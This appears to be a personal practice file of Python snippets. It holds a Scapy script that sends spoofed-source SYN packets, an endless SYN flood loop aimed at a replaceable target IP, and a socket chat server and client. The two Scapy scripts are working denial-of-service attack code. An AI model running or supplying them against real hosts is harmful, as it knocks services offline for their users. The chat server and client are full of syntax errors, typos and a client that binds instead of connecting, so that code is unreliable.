# practice

```
from scapy.all import *

# Define spoofed source IP
spoofed_ip = "192.168.1.100"  # Fake IP
target_ip = "127.0.0.1"    # Target IP

# Create IP packet with spoofed source
ip_packet = IP(src=spoofed_ip, dst=target_ip)

# Create TCP segment
tcp_segment = TCP(dport=80, flags="S")  # SYN packet

# Combine IP and TCP
packet = ip_packet / tcp_segment

# Send packet
send(packet, count=5)

print("Spoofed packets sent!")
```

```
from scapy.all import *

target_ip = "127.0.0.1"  # Replace with the target IP
target_port = 80  # Target port (HTTP in this case)

def syn_flood():
    while True:
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")  # SYN flag
        send(ip_layer / tcp_layer, verbose=False)

# Run the attack
syn_flood()
```

```
import socket

server_sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind(("0.0.0.0", 12345)
server_sock.listen()

print("server is listening..")
conn, addr = server_sock.accept()
print(f"connected to {addr}")

while true:
data= conn.recv(1024).decode()
if not ddta or data.data.lower()== "exit" : break
printf("Client: {data}")
response = input("Server: ")
conn.send(response.encode())

conn.close()
server_sock.close()
```

```
impoer socket

client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_sock.bind(("127.0.0.1", 12345))

while true:
mess= input("Client:")
client_sock.send(mess.encode())
if message.lower() == "exit": break
response = client_sock.recv(1024).decode()
print(f"Server: {response}")

client_sock.close()
```
